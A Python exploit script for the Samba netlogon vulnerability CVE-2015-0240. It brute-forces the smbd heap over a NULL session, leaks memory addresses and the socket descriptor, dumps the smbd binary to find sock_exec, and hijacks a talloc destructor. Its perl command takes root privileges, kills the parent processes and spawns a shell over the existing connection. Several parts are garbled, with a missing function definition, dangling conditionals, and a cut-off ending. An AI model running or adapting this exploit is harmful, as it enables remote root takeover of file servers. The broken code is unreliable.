"""
Exploit for Samba vulnerabilty (CVE-2015-0240) by sleepya
 
The exploit only targets vulnerable x86 smbd <3.6.24 which &#039;creds&#039; is controlled by
ReferentID field of PrimaryName (ServerName). That means &#039;_talloc_zero()&#039;
in libtalloc does not write a value on &#039;creds&#039; address.
 
Reference:
- https://securityblog.redhat.com/2015/02/23/samba-vulnerability-cve-2015-0240/
 
Note:
- heap might be changed while running exploit, need to try again (with &#039;-hs&#039; or &#039;-pa&#039; option)
  if something failed
 
Find heap address:
- ubuntu PIE heap start range: b7700000 - b9800000
- start payload size: the bigger it is the lesser connection and binding time.
  but need more time to shrink payload size
- payload is too big to fit in freed small hole. so payload is always at end
  of heap
- start bruteforcing heap address from high memory address to low memory address
 
Leak info:
  accepted connection and fork but before calling smbd_server_connection_loop_once()
- before talloc_stackframe_pool(8192) is called, there are many holes in heap
  but their size are <8K. so pool is at the end of heap at this time
- many data that allocated after talloc_stackframe_pool(8192) are allocated in pool.
  with the same pattern of request, the layout in pool are always the same.
- many data are not allocated in pool but fit in free holes. so no small size data are
  allocated after pool.
- normally there are only few data block allocated after pool.
  - pool size: 0x2048 (included glibc heap header 4 bytes)
  - a table that created in giconv_open(). the size is 0x7f88 (included glibc heap header 4 bytes)
  - p->in_data.pdu.data. the size is 0x10e8 (included glibc heap header 4 bytes)
    - this might not be allocated here because its size might fit in freed hole
      - so last fragment should be padded
  - ndr DATA_BLOB. the size is 0x10d0 (included glibc heap header 4 bytes)
    - this might not be allocated here because its size might fit in freed hole
  - p->in_data.data.data. the size is our netlogon data
    - for 8K payload, the size is 0x2168 (included glibc heap header 4 bytes)
    - this data is allocated by realloc(), grew by each fragment. so this memory
      block is not allocated by mmapped even the size is very big.
- pool layout for interested data
  - r->out offset from pool (talloc header) is 0x13c0
    - r->out.return_authenticator offset from pool is 0x13c0+0x18
      - overwrite this (with link unlink) to leak info in ServerPasswordSet response
  - smb_request offset from pool (talloc header) is 0x11a0
    - smb_request.sconn offset from pool is 0x11a0+0x3c
      - socket fd is at smb_request.sconn address (first struct member)
- more shared folder in configuration, more freed heap holes
  - only if there is no or one shared, many data might be unexpected allocated after pool.
    have to get that extra offset or bruteforce it
 
 
More exploitation detail in code (comment) ;)
"""
 
import sys
import time
from struct import pack,unpack
import argparse
 
import impacket
from impacket.dcerpc.v5 import transport, nrpc
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR
 
 
class Requester:
    """
    put all smb request stuff into class. help my editor folding them
    """
     
    # impacket does not implement NetrServerPasswordSet
    # 3.5.4.4.6 NetrServerPasswordSet (Opnum 6)
    class NetrServerPasswordSet(NDRCALL):
        opnum = 6
        structure = (
           (&#039;PrimaryName&#039;,nrpc.PLOGONSRV_HANDLE),
           (&#039;AccountName&#039;,WSTR),
           (&#039;SecureChannelType&#039;,nrpc.NETLOGON_SECURE_CHANNEL_TYPE),
           (&#039;ComputerName&#039;,WSTR),
           (&#039;Authenticator&#039;,nrpc.NETLOGON_AUTHENTICATOR),
           (&#039;UasNewPassword&#039;,nrpc.ENCRYPTED_NT_OWF_PASSWORD),
        )
    # response is authenticator (8 bytes) and error code (4 bytes)
 
    # size of each field in sent packet
    req_server_handle_size = 16
    req_username_hdr_size = 4 + 4 + 4 + 2 # max count, offset, actual count, trailing null
    req_sec_type_size = 2
    req_computer_size = 4 + 4 + 4 + 2
    req_authenticator_size = 8 + 2 + 4
    req_new_pwd_size = 16
     
    samba_rpc_fragment_size = 4280
    netlogon_data_fragment_size = samba_rpc_fragment_size - 8 - 24  # 24 is dcerpc header size
     
    def __init__(self):
        self.target = None
        self.dce = None
         
        sessionKey = &#039;\x00&#039;*16
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator[&#039;Credential&#039;] = nrpc.ComputeNetlogonCredential(&#039;12345678&#039;, sessionKey)
        authenticator[&#039;Timestamp&#039;] = 10
 
        uasNewPass = nrpc.ENCRYPTED_NT_OWF_PASSWORD()
        uasNewPass[&#039;Data&#039;] = &#039;\x00&#039;*16
 
        self.serverName = nrpc.PLOGONSRV_HANDLE()
        # ReferentID field of PrimaryName controls the uninitialized value of creds
        self.serverName.fields[&#039;ReferentID&#039;] = 0
         
        self.accountName = WSTR()
 
        request = Requester.NetrServerPasswordSet()
        request[&#039;PrimaryName&#039;] = self.serverName
        request[&#039;AccountName&#039;] = self.accountName
        request[&#039;SecureChannelType&#039;] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel
        request[&#039;ComputerName&#039;] = &#039;\x00&#039;
        request[&#039;Authenticator&#039;] = authenticator
        request[&#039;UasNewPassword&#039;] = uasNewPass
        self.request = request
     
    def set_target(self, target):
        self.target = target
         
    def set_payload(self, s, pad_to_size=0):
        if pad_to_size > 0:
            s += &#039;\x00&#039;*(pad_to_size-len(s))
        pad_size = 0
        if len(s) < (16*1024+1):
            if ofsize > 0:
                pad_size = self.netlogon_data_fragment_size - ofsize
         
        self.accountName.fields[&#039;Data&#039;] = s+&#039;\x00&#039;*pad_size+&#039;\x00\x00&#039;
        self.accountName.fields[&#039;MaximumCount&#039;] = None
        self.accountName.fields[&#039;ActualCount&#039;] = None
        self.accountName.data = None        # force recompute
         
    set_accountNameData = set_payload
 
    def get_dce(self):
        if self.dce is None or self.dce.lostconn:
            rpctransport = transport.DCERPCTransportFactory(r&#039;ncacn_np:%s[\PIPE\netlogon]&#039; % self.target)
            rpctransport.set_credentials(&#039;&#039;,&#039;&#039;)  # NULL session
            rpctransport.set_dport(445)
            # force to &#039;NT LM 0.12&#039; only
             
            self.dce = rpctransport.get_dce_rpc()
            self.dce.connect()
            self.dce.bind(nrpc.MSRPC_UUID_NRPC)
            self.dce.lostconn = False
        return self.dce
 
    def get_socket(self):
        return self.dce.get_rpc_transport().get_socket()
     
    def force_dce_disconnect(self):
        if not (self.dce is None or self.dce.lostconn):
            self.get_socket().close()
            self.dce.lostconn = True
 
    def request_addr(self, addr):
        self.serverName.fields[&#039;ReferentID&#039;] = addr
         
        dce = self.get_dce()
        try:
            dce.call(self.request.opnum, self.request)
            answer = dce.recv()
            return unpack("<IIII", answer)
        except impacket.nmb.NetBIOSError as e:
            if e.args[0] != &#039;Error while reading from remote&#039;:
                raise
            dce.lostconn = True
        return None
 
    # call with no read
    def call_addr(self, addr):
        self.serverName.fields[&#039;ReferentID&#039;] = addr
         
        dce = self.get_dce()
        try:
            dce.call(self.request.opnum, self.request)
            return True
        except impacket.nmb.NetBIOSError as e:
            if e.args[0] != &#039;Error while reading from remote&#039;:
                raise
            dce.lostconn = True
        return False
     
    def force_recv(self):
        dce = self.get_dce()
        return dce.get_rpc_transport().recv(forceRecv=True)
 
    def request_check_valid_addr(self, addr):
        answers = self.request_addr(addr)
        if answers is None:
            return False # connection lost
        elif answers[3] != 0:
            return True  # error, expected
        else:
            raise Error(&#039;Unexpected result&#039;)
 
 
# talloc constants
TALLOC_MAGIC = 0xe8150c70  # for talloc 2.0
TALLOC_FLAG_FREE = 0x01
TALLOC_FLAG_LOOP = 0x02
TALLOC_FLAG_POOL = 0x04
TALLOC_FLAG_POOLMEM = 0x08
 
TALLOC_HDR_SIZE = 0x30  # for 32 bit
 
flag_loop = TALLOC_MAGIC | TALLOC_FLAG_LOOP  # for checking valid address
 
TARGET_PAYLOAD_SIZE = 8192
 
########
# request helper functions
########
 
# only one global requester
requester = Requester()
 
def force_dce_disconnect():
    requester.force_dce_disconnect()
 
def request_addr(addr):
    return requester.request_addr(addr)
 
def request_check_valid_addr(addr):
    return requester.request_check_valid_addr(addr)
 
def set_payload(s, pad_to_size=0):
    requester.set_payload(s, pad_to_size)
 
def get_socket():
    return requester.get_socket()
     
def call_addr(addr):
    return requester.call_addr(addr)
 
def force_recv():
    return requester.force_recv()
         
########
# find heap address
########
 
# only refs MUST be NULL, other never be checked
fake_chunk_find_heap = pack("<IIIIIIII",
    0, 0, 0, 0, # refs
    flag_loop, flag_loop, flag_loop, flag_loop,
)
 
def find_valid_heap_addr(start_addr, stop_addr, payload_size, first=False):
    """
    below code can be used for checking valid heap address (no crash)
 
    if (unlikely(tc->flags & TALLOC_FLAG_LOOP)) {
        /* we have a free loop - stop looping */
        return 0;
    }
    """
    global fake_chunk_find_heap
    payload = fake_chunk_find_heap*(payload_size/len(fake_chunk_find_heap))
    set_payload(payload)
    addr_step = payload_size
    addr = start_addr
    i = 0
    while addr > stop_addr:
        if i == 16:
            print(" [*]trying addr: {:x}".format(addr))
            i = 0
         
        if request_check_valid_addr(addr):
            return addr
        if first:
            # first time, the last 16 bit is still do not know
            # have to do extra check
            if request_check_valid_addr(addr+0x10):
                return addr+0x10
        addr -= addr_step
        i += 1
    return None
 
def find_valid_heap_exact_addr(addr, payload_size):
    global fake_chunk_find_heap
    fake_size = payload_size // 2
    while fake_size >= len(fake_chunk_find_heap):
        payload = fake_chunk_find_heap*(fake_size/len(fake_chunk_find_heap))
        set_payload(payload, payload_size)
        if not request_check_valid_addr(addr):
            addr -= fake_size
        fake_size = fake_size // 2
     
    set_payload(&#039;\x00&#039;*16 + pack("<I", flag_loop), payload_size)
    # because glibc heap is align by 8
    # so the last 4 bit of address must be 0x4 or 0xc
    if request_check_valid_addr(addr-4):
        addr -= 4
    elif request_check_valid_addr(addr-0xc):
        addr -= 0xc
    else:
        print(" [-] bad exact addr: {:x}".format(addr))
        return 0
     
    print(" [*] checking exact addr: {:x}".format(addr))
     
    if (addr & 4) == 0:
        return 0
     
    # test the address
     
    # must be invalid (refs is AccountName.ActualCount)
    set_payload(&#039;\x00&#039;*12 + pack("<I", flag_loop), payload_size)
    if request_check_valid_addr(addr-4):
        print(&#039; [-] request_check_valid_addr(addr-4) failed&#039;)
        return 0
    # must be valid (refs is AccountName.Offset)
    # do check again if fail. sometimes heap layout is changed
    set_payload(&#039;\x00&#039;*8 + pack("<I", flag_loop), payload_size)
    if not request_check_valid_addr(addr-8) and not request_check_valid_addr(addr-8) :
        print(&#039; [-] request_check_valid_addr(addr-8) failed&#039;)
        return 0
    # must be invalid (refs is AccountName.MaxCount)
    set_payload(&#039;\x00&#039;*4 + pack("<I", flag_loop), payload_size)
    if request_check_valid_addr(addr-0xc):
        print(&#039; [-] request_check_valid_addr(addr-0xc) failed&#039;)
        return 0
    # must be valid (refs is ServerHandle.ActualCount)
    # do check again if fail. sometimes heap layout is changed
    set_payload(pack("<I", flag_loop), payload_size)
    if not request_check_valid_addr(addr-0x10) and not request_check_valid_addr(addr-0x10):
        print(&#039; [-] request_check_valid_addr(addr-0x10) failed&#039;)
        return 0
         
    return addr
 
def find_payload_addr(start_addr, start_payload_size, target_payload_size):
    print(&#039;[*] bruteforcing heap address...&#039;)
 
    start_addr = start_addr & 0xffff0000
         
    heap_addr = 0
    while heap_addr == 0:
        # loop from max to 0xb7700000 for finding heap area
        # offset 0x20000 is minimum offset from heap start to recieved data in heap
        stop_addr = 0xb7700000 + 0x20000
        good_addr = None
        payload_size = start_payload_size
        while payload_size >= target_payload_size:
            force_dce_disconnect()
            found_addr = None
            for i in range(3):
                found_addr = find_valid_heap_addr(start_addr, stop_addr, payload_size, good_addr is None)
                if found_addr is not None:
                    break
            if found_addr is None:
                # failed
                good_addr = None
                break
            good_addr = found_addr
            print(" [*] found valid addr ({:d}KB): {:x}".format(payload_size//1024, good_addr))
            start_addr = good_addr
            stop_addr = good_addr - payload_size + 0x20
            payload_size //= 2
 
        if good_addr is not None:
            # try 3 times to find exact address. if address cannot be found, assume
            # minimizing payload size is not correct. start minimizing again
            for i in range(3):
                heap_addr = find_valid_heap_exact_addr(good_addr, target_payload_size)
                if heap_addr != 0:
                    break
                force_dce_disconnect()
         
        if heap_addr == 0:
            print(&#039; [-] failed to find payload adress&#039;)
            # start from last good address + some offset
            start_addr = (good_addr + 0x10000) & 0xffff0000
            print(&#039;[*] bruteforcing heap adress again from {:x}&#039;.format(start_addr))
     
    payload_addr = heap_addr - len(fake_chunk_find_heap)
    print(" [+] found payload addr: {:x}".format(payload_addr))
    return payload_addr
 
 
########
# leak info
########
 
    def is_badchar(v):
        return (v >= 0xd8) and (v <= 0xdf)
     
    if is_badchar((addr)&0xff) or is_badchar((addr>>16)&0xff):
    if is_badchar((addr>>8)&0xff) or is_badchar((addr>>24)&0xff):
     
    """
    Note:
      because of below code in _talloc_free_internal()
    """
    # Note: U+D800 to U+DFFF is reserved (also bad char for samba)
    # check if &#039;\x00&#039; is needed to avoid utf16 badchar
        return None # cannot avoid badchar
 
    fake_chunk_leak_info = pack("<IIIIIIIIIIII",
        0, 0, # parent, children
        0, 0, # refs, destructor
        0, 0, # name, size
        TALLOC_MAGIC | TALLOC_FLAG_POOL, # flag
        0, 0, 0, # pool, pad, pad
        )
    set_payload(payload, TARGET_PAYLOAD_SIZE)
    if call_only:
     
    for i in range(3 if retry else 1):
        try:
        except impacket.dcerpc.v5.rpcrt.Exception:
            print("impacket.dcerpc.v5.rpcrt.Exception")
            answers = None
            force_dce_disconnect()
        if answers is not None:
                break
            #print(&#039;{:x}, {:x}, {:x}, {:x}&#039;.format(answers[0], answers[1], answers[2], answers[3]))
            force_dce_disconnect() # heap is corrupted, disconnect it
     
    return answers
     
def leak_info_addr(payload_addr, r_out_addr, leak_addr, retry=True):
    # leak by replace r->out.return_authenticator pointer
    # Note:  because leak_addr[4:8] will be replaced with r_out_addr
    # only answers[0] and answers[2] are leaked
    return leak_info_unlink(payload_addr, leak_addr, r_out_addr, retry)
 
def leak_info_addr2(payload_addr, r_out_addr, leak_addr, retry=True):
    # leak by replace r->out.return_authenticator pointer
    # Note: leak_addr[0:4] will be replaced with r_out_addr
    # only answers[1] and answers[2] are leaked
    return leak_info_unlink(payload_addr, r_out_addr-4, leak_addr-4, retry)
 
def leak_uint8t_addr(payload_addr, r_out_addr, chunk_addr):
    # leak name field (&#039;uint8_t&#039;) in found heap chunk
    # do not retry this leak, because r_out_addr is guessed
    answers = leak_info_addr(payload_addr, r_out_addr, chunk_addr + 0x18, False)
    if answers is None:
        return None
    if answers[2] != TALLOC_MAGIC:
        force_dce_disconnect()
        return None
 
    return answers[0]
 
def leak_info_find_offset(info):
    # offset from pool to payload still does not know
    print("[*] guessing &#039;r&#039; offset and leaking &#039;uint8_t&#039; address ...")
    chunk_addr = info[&#039;chunk_addr&#039;]
    uint8t_addr = None
    r_addr = None
    r_out_addr = None
    while uint8t_addr is None:
        # 0x8c10 <= 4 + 0x7f88 + 0x2044 - 0x13c0
        # 0x9ce0 <= 4 + 0x7f88 + 0x10d0 + 0x2044 - 0x13c0
        # 0xadc8 <= 4 + 0x7f88 + 0x10e8 + 0x10d0 + 0x2044 - 0x13c0
        # 0xad40 is extra offset when no share on debian
        # 0x10d38 is extra offset when only [printers] is shared on debian
        for offset in (0x8c10, 0x9ce0, 0xadc8, 0xad40, 0x10d38):
            r_addr = chunk_addr - offset
            # 0x18 is out.authenticator offset
            r_out_addr = r_addr + 0x18
            print(" [*] try &#039;r&#039; offset 0x{:x}, r_out addr: 0x{:x}".format(offset, r_out_addr))
             
            uint8t_addr = leak_uint8t_addr(info[&#039;payload_addr&#039;], r_out_addr, chunk_addr)
            if uint8t_addr is not None:
                print("  [*] success")
                break
            print("  [-] failed")
        if uint8t_addr is None:
            return False
     
    info[&#039;uint8t_addr&#039;] = uint8t_addr
    info[&#039;r_addr&#039;] = r_addr
    info[&#039;r_out_addr&#039;] = r_out_addr
    info[&#039;pool_addr&#039;] = r_addr - 0x13c0
     
    print(" [+] text &#039;uint8_t&#039; addr: {:x}".format(info[&#039;uint8t_addr&#039;]))
    print(" [+] pool addr: {:x}".format(info[&#039;pool_addr&#039;]))
     
    return True
     
def leak_sock_fd(info):
    # leak sock fd from
    # smb_request->sconn->sock
    #   (offset: ->0x3c ->0x0 )
    print("[*] leaking socket fd ...")
    info[&#039;smb_request_addr&#039;] = info[&#039;pool_addr&#039;]+0x11a0
    print(" [*] smb request addr: {:x}".format(info[&#039;smb_request_addr&#039;]))
    answers = leak_info_addr2(info[&#039;payload_addr&#039;], info[&#039;r_out_addr&#039;], info[&#039;smb_request_addr&#039;]+0x3c-4)
    if answers is None:
        print(&#039; [-] cannot leak sconn_addr address :(&#039;)
        return None
    force_dce_disconnect() # heap is corrupted, disconnect it
    sconn_addr = answers[2]
    info[&#039;sconn_addr&#039;] = sconn_addr
    print(&#039; [+] sconn addr: {:x}&#039;.format(sconn_addr))
     
    # write in padding of chunk, no need to disconnect
    answers = leak_info_addr2(info[&#039;payload_addr&#039;], info[&#039;r_out_addr&#039;], sconn_addr)
    if answers is None:
        print(&#039;cannot leak sock_fd address :(&#039;)
        return None
    sock_fd = answers[1]
    print(&#039; [+] sock fd: {:d}&#039;.format(sock_fd))
    info[&#039;sock_fd&#039;] = sock_fd
    return sock_fd
 
def leak_talloc_pop_addr(info):
    # leak destructor talloc_pop() address
    # overwrite name field, no need to disconnect
    print(&#039;[*] leaking talloc_pop address&#039;)
    answers = leak_info_addr(info[&#039;payload_addr&#039;], info[&#039;r_out_addr&#039;], info[&#039;pool_addr&#039;] + 0x14)
    if answers is None:
        print(&#039; [-] cannot leak talloc_pop() address :(&#039;)
        return None
    if answers[2] != 0x2010: # chunk size must be 0x2010
        print(&#039; [-] cannot leak talloc_pop() address. answers[2] is wrong :(&#039;)
        return None
    talloc_pop_addr = answers[0]
    print(&#039; [+] talloc_pop addr: {:x}&#039;.format(talloc_pop_addr))
    info[&#039;talloc_pop_addr&#039;] = talloc_pop_addr
    return talloc_pop_addr
 
def leak_smbd_server_connection_handler_addr(info):
    # leak address from
    # smbd_server_connection.smb1->fde ->handler
    #       (offset:             ->0x9c->0x14 )
    # MUST NOT disconnect after getting smb1_fd_event address
    print(&#039;[*] leaking smbd_server_connection_handler address&#039;)
    def real_leak_conn_handler_addr(info):
        answers = leak_info_addr2(info[&#039;payload_addr&#039;], info[&#039;r_out_addr&#039;], info[&#039;sconn_addr&#039;] + 0x9c)
        if answers is None:
            print(&#039; [-] cannot leak smb1_fd_event address :(&#039;)
            return None
        smb1_fd_event_addr = answers[1]
        print(&#039; [*] smb1_fd_event addr: {:x}&#039;.format(smb1_fd_event_addr))
         
        answers = leak_info_addr(info[&#039;payload_addr&#039;], info[&#039;r_out_addr&#039;], smb1_fd_event_addr+0x14)
        if answers is None:
            print(&#039; [-] cannot leak smbd_server_connection_handler address :(&#039;)
            return None
        force_dce_disconnect() # heap is corrupted, disconnect it
        smbd_server_connection_handler_addr = answers[0]
        diff = info[&#039;talloc_pop_addr&#039;] - smbd_server_connection_handler_addr
        if diff > 0x2000000 or diff < 0:
            print(&#039; [-] get wrong smbd_server_connection_handler addr: {:x}&#039;.format(smbd_server_connection_handler_addr))
            smbd_server_connection_handler_addr = None
        return smbd_server_connection_handler_addr
     
    smbd_server_connection_handler_addr = None
    while smbd_server_connection_handler_addr is None:
        smbd_server_connection_handler_addr = real_leak_conn_handler_addr(info)
     
    print(&#039; [+] smbd_server_connection_handler addr: {:x}&#039;.format(smbd_server_connection_handler_addr))
    info[&#039;smbd_server_connection_handler_addr&#039;] = smbd_server_connection_handler_addr
     
    return smbd_server_connection_handler_addr
 
def find_smbd_base_addr(info):
    # estimate smbd_addr from talloc_pop
    if (info[&#039;talloc_pop_addr&#039;] & 0xf) != 0 or (info[&#039;smbd_server_connection_handler_addr&#039;] & 0xf) != 0:
        # code has no alignment
        start_addr = info[&#039;smbd_server_connection_handler_addr&#039;] - 0x124000
    else:
        start_addr = info[&#039;smbd_server_connection_handler_addr&#039;] - 0x130000
    start_addr = start_addr & 0xfffff000
    stop_addr = start_addr - 0x20000
     
    print(&#039;[*] finding smbd loaded addr ...&#039;)
    while True:
        smbd_addr = start_addr
        while smbd_addr >= stop_addr:
                # smbd_addr is 0xb?d?e000
                test_addr = smbd_addr - 0x800 - 4
            else:
                test_addr = smbd_addr - 8
            # test writable on test_addr
            answers = leak_info_addr(info[&#039;payload_addr&#039;], 0, test_addr, retry=False)
            if answers is not None:
                break
        if smbd_addr > stop_addr:
            break
        print(&#039; [-] failed. try again.&#039;)
         
    info[&#039;smbd_addr&#039;] = smbd_addr
    print(&#039; [+] found smbd loaded addr: {:x}&#039;.format(smbd_addr))
 
def dump_mem_call_addr(info, target_addr):
    # leak pipes_struct address from
    # smbd_server_connection->chain_fsp->fake_file_handle->private_data
    #       (offset:        ->0x48     ->0xd4            ->0x4 )
    # Note:
    # - MUST NOT disconnect because chain_fsp,fake_file_handle,pipes_struct address will be changed
    # - target_addr will be replaced with current_pdu_sent address
    # check read_from_internal_pipe() in source3/rpc_server/srv_pipe_hnd.c
    print(&#039; [*] overwrite current_pdu_sent for dumping memory ...&#039;)
    answers = leak_info_addr2(info[&#039;payload_addr&#039;], info[&#039;r_out_addr&#039;], info[&#039;smb_request_addr&#039;] + 0x48)
    if answers is None:
        print(&#039;  [-] cannot leak chain_fsp address :(&#039;)
        return False
    chain_fsp_addr = answers[1]
    print(&#039;  [*] chain_fsp addr: {:x}&#039;.format(chain_fsp_addr))
     
    answers = leak_info_addr(info[&#039;payload_addr&#039;], info[&#039;r_out_addr&#039;], chain_fsp_addr+0xd4, retry=False)
    if answers is None:
        print(&#039;  [-] cannot leak fake_file_handle address :(&#039;)
        return False
    fake_file_handle_addr = answers[0]
    print(&#039;  [*] fake_file_handle addr: {:x}&#039;.format(fake_file_handle_addr))
 
    answers = leak_info_addr2(info[&#039;payload_addr&#039;], info[&#039;r_out_addr&#039;], fake_file_handle_addr+0x4-0x4, retry=False)
    if answers is None:
        print(&#039;  [-] cannot leak pipes_struct address :(&#039;)
        return False
    pipes_struct_addr = answers[2]
    print(&#039;  [*] pipes_struct addr: {:x}&#039;.format(pipes_struct_addr))
     
    current_pdu_sent_addr = pipes_struct_addr+0x84
    print(&#039;  [*] current_pdu_sent addr: {:x}&#039;.format(current_pdu_sent_addr))
    # change pipes->out_data.current_pdu_sent to dump memory
    return leak_info_unlink(info[&#039;payload_addr&#039;], current_pdu_sent_addr-4, target_addr, call_only=True)
 
def dump_smbd_find_bininfo(info):
    def recv_till_string(data, s):
        pos = len(data)
        while True:
            data += force_recv()
            if len(data) == pos:
                print(&#039;no more data !!!&#039;)
                return None
            p = data.find(s, pos-len(s))
            if p != -1:
                return (data, p)
            pos = len(data)
        return None
 
    def lookup_dynsym(dynsym, name_offset):
        addr = 0
        i = 0
        offset_str = pack("<I", name_offset)
        while i < len(dynsym):
            if dynsym[i:i+4] == offset_str:
                addr = unpack("<I", dynsym[i+4:i+8])[0]
                break
            i += 16
        return addr
     
    print(&#039;[*] dumping smbd ...&#039;)
    dump_call = False
    # have to minus from smbd_addr because code section is read-only
        # smbd_addr is 0xb?d?e000
        dump_addr = info[&#039;smbd_addr&#039;] - 0x800 - 4
    else:
        dump_addr = info[&#039;smbd_addr&#039;] - 4
    for i in range(8):
        if dump_mem_call_addr(info, dump_addr):
            mem = force_recv()
            if len(mem) == 4280:
                dump_call = True
                break
        print(&#039; [-] dump_mem_call_addr failed. try again&#039;)
        force_dce_disconnect()
    if not dump_call:
        print(&#039; [-] dump smbd failed&#039;)
        return False
     
    print(&#039; [+] dump success. getting smbd ...&#039;)
    # first time, remove any data before \7fELF
    mem = mem[mem.index(&#039;\x7fELF&#039;):]
 
    mem, pos = recv_till_string(mem, &#039;\x00__gmon_start__\x00&#039;)
    print(&#039; [*] found __gmon_start__ at {:x}&#039;.format(pos+1))
     
    pos = mem.rfind(&#039;\x00\x00&#039;, 0, pos-1)
    dynstr_offset = pos+1
    print(&#039; [*] found .dynstr section at {:x}&#039;.format(dynstr_offset))
     
    dynstr = mem[dynstr_offset:]
    mem = mem[:dynstr_offset]
     
    # find start of .dynsym section
    pos = len(mem) - 16
    while pos > 0:
        if mem[pos:pos+16] == &#039;\x00&#039;*16:
            break
        pos -= 16 # sym entry size is 16 bytes
    if pos <= 0:
        print(&#039; [-] found wrong .dynsym section at {:x}&#039;.format(pos))
        return None
    dynsym_offset = pos
    print(&#039; [*] found .dynsym section at {:x}&#039;.format(dynsym_offset))
    dynsym = mem[dynsym_offset:]
     
    # find sock_exec
    dynstr, pos = recv_till_string(dynstr, &#039;\x00sock_exec\x00&#039;)
    print(&#039; [*] found sock_exec string at {:x}&#039;.format(pos+1))
    sock_exec_offset = lookup_dynsym(dynsym, pos+1)
    print(&#039; [*] sock_exec offset {:x}&#039;.format(sock_exec_offset))
         
    #info[&#039;mem&#039;] = mem  # smbd data before .dynsym section
    info[&#039;dynsym&#039;] = dynsym
    info[&#039;dynstr&#039;] = dynstr # incomplete section
    info[&#039;sock_exec_addr&#039;] = info[&#039;smbd_addr&#039;]+sock_exec_offset
    print(&#039; [+] sock_exec addr: {:x}&#039;.format(info[&#039;sock_exec_addr&#039;]))
     
    # Note: can continuing memory dump to find ROP
     
    force_dce_disconnect()
     
########
# code execution
########
def call_sock_exec(info):
        return False # too bad... cannot call
    fake_talloc_chunk_exec = pack("<IIIIIIIIIIII",
        0, 0,  # parent, child
        0, # refs
        info[&#039;sock_exec_addr&#039;], # destructor
        0, 0, # name, size
        TALLOC_MAGIC | TALLOC_FLAG_POOL, # flag
        0, 0, 0, # pool, pad, pad
    )
    set_payload(chunk, TARGET_PAYLOAD_SIZE)
    for i in range(3):
            print(&#039;waiting for shell :)&#039;)
            return True
    print(&#039;something wrong :(&#039;)
    return False
 
########
# start work
########
 
def check_exploitable():
    if request_check_valid_addr(0x41414141):
        print(&#039;[-] seems not vulnerable&#039;)
        return False
    if request_check_valid_addr(0):
        print(&#039;[+] seems exploitable :)&#039;)
        return True
     
    print("[-] seems vulnerable but I cannot exploit")
    print("[-] I can exploit only if &#039;creds&#039; is controlled by &#039;ReferentId&#039;")
    return False
 
def do_work(args):
    info = {}
     
    if not (args.payload_addr or args.heap_start or args.start_payload_size):
        if not check_exploitable():
            return
 
    start_size = 512*1024 # default size with 512KB
    if args.payload_addr:
        info[&#039;payload_addr&#039;] = args.payload_addr
    else:
        heap_start = args.heap_start if args.heap_start else 0xb9800000+0x30000
        if args.start_payload_size:
            start_size = args.start_payload_size * 1024
        if start_size < TARGET_PAYLOAD_SIZE:
            start_size = 512*1024 # back to default
        info[&#039;payload_addr&#039;] = find_payload_addr(heap_start, start_size, TARGET_PAYLOAD_SIZE)
     
    # the real talloc chunk address that stored the raw netlogon data
    # serverHandle 0x10 bytes. accountName 0xc bytes
    info[&#039;chunk_addr&#039;] = info[&#039;payload_addr&#039;] - 0x1c - TALLOC_HDR_SIZE
    print("[+] chunk addr: {:x}".format(info[&#039;chunk_addr&#039;]))
 
    while not leak_info_find_offset(info):
        # Note: do heap bruteforcing again seems to be more effective
        # start from payload_addr + some offset
        print("[+] bruteforcing heap again. start from {:x}".format(info[&#039;payload_addr&#039;]+0x10000))
        info[&#039;payload_addr&#039;] = find_payload_addr(info[&#039;payload_addr&#039;]+0x10000, start_size, TARGET_PAYLOAD_SIZE)
        info[&#039;chunk_addr&#039;] = info[&#039;payload_addr&#039;] - 0x1c - TALLOC_HDR_SIZE
        print("[+] chunk addr: {:x}".format(info[&#039;chunk_addr&#039;]))
 
    got_fd = leak_sock_fd(info)
     
    # create shell command for reuse sock fd
    cmd = "perl -e &#039;use POSIX qw(dup2);$)=0;$>=0;"  # seteuid, setegid
    cmd += "dup2({0:d},0);dup2({0:d},1);dup2({0:d},2);".format(info[&#039;sock_fd&#039;]) # dup sock
    # have to kill grand-grand-parent process because sock_exec() does fork() then system()
    # the smbd process still receiving data from socket
    cmd += "$z=getppid;$y=`ps -o ppid= $z`;$x=`ps -o ppid= $y`;kill 15,$x,$y,$z;"  # kill parents
    cmd += """print "shell ready\n";exec "/bin/sh";&#039;"""  # spawn shell
    info[&#039;cmd&#039;] = cmd
 
    # Note: cannot use system@plt because binary is PIE and chunk dtor is called in libtalloc.
    #       the ebx is not correct for resolving the system address
    smbd_info = {
        0x5dd: { &#039;uint8t_offset&#039;: 0x711555, &#039;talloc_pop&#039;: 0x41a890, &#039;sock_exec&#039;: 0x0044a060, &#039;version&#039;: &#039;3.6.3-2ubuntu2 - 3.6.3-2ubuntu2.3&#039;},
        0xb7d: { &#039;uint8t_offset&#039;: 0x711b7d, &#039;talloc_pop&#039;: 0x41ab80, &#039;sock_exec&#039;: 0x0044a380, &#039;version&#039;: &#039;3.6.3-2ubuntu2.9&#039;},
        0xf7d: { &#039;uint8t_offset&#039;: 0x710f7d, &#039;talloc_pop&#039;: 0x419f80, &#039;sock_exec&#039;: 0x00449770, &#039;version&#039;: &#039;3.6.3-2ubuntu2.11&#039;},
        0xf1d: { &#039;uint8t_offset&#039;: 0x71ff1d, &#039;talloc_pop&#039;: 0x429e80, &#039;sock_exec&#039;: 0x004614b0, &#039;version&#039;: &#039;3.6.6-6+deb7u4&#039;},
    }
 
    leak_talloc_pop_addr(info)  # to double check the bininfo
    bininfo = smbd_info.get(info[&#039;uint8t_addr&#039;] & 0xfff)
    if bininfo is not None:
        smbd_addr = info[&#039;uint8t_addr&#039;] - bininfo[&#039;uint8t_offset&#039;]
        if smbd_addr + bininfo[&#039;talloc_pop&#039;] == info[&#039;talloc_pop_addr&#039;]:
            # correct info
            print(&#039;[+] detect smbd version: {:s}&#039;.format(bininfo[&#039;version&#039;]))
            info[&#039;smbd_addr&#039;] = smbd_addr
            info[&#039;sock_exec_addr&#039;] = smbd_addr + bininfo[&#039;sock_exec&#039;]
            print(&#039; [*] smbd loaded addr: {:x}&#039;.format(smbd_addr))
            print(&#039; [*] use sock_exec offset: {:x}&#039;.format(bininfo[&#039;sock_exec&#039;]))
            print(&#039; [*] sock_exec addr: {:x}&#039;.format(info[&#039;sock_exec_addr&#039;]))
        else:
            # wrong info
            bininfo = None
         
    got_shell = False
    if bininfo is None:
